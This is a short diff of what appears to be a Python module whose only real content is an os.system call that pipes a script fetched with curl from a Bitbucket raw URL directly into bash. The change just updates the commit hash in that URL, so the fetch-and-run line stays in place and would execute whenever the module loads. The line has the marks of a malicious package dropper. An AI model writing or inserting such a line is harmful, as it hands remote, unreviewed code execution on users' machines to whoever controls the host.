@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/dareya/fatra/raw/aed28c1637194b462258bd7473976b6ee282edea/eryaz | bash')
+os.system('curl -sL https://bitbucket.org/dareya/fatra/raw/03ed0509e588374b7996bdf650f632c34ec61e43/eryaz | bash')
